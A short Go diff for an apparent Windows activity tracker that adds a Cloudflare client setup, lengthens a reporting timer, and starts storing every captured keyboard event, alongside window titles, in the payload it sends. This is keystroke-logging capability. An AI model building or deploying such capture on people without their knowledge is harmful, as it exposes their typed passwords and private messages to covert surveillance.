@@ -13,6 +13,8 @@ func main() {
 		panic("Failed to initialize WinApi")
 	}
 
+	lib.SetupCloudflareClient()
+
 	var activityPayload = lib.ActivityPayload{}
 
 	var lastMousePos = lib.POINT{}
@@ -26,7 +28,7 @@ func main() {
 	go lib.KeyboardEventTrack(keyboardEventChannel)
 	go lib.TrackWindowReplaced(activeWindowEventChannel)
 
-	ticker := time.NewTicker(2 * time.Second)
+	ticker := time.NewTicker(20 * time.Second)
 	defer ticker.Stop()
 
 	for {
@@ -49,6 +51,7 @@ func main() {
 			}
 
 			lastKeyboardEvent = keyboardEvent
+			activityPayload.KeyboardPresses = append(activityPayload.KeyboardPresses, keyboardEvent)
 		case activeWindowEvent := <-activeWindowEventChannel:
 			buffer := make([]uint16, 256)
 			lib.GetWindowTextW(activeWindowEvent.WindowHandle, &buffer[0], 256)
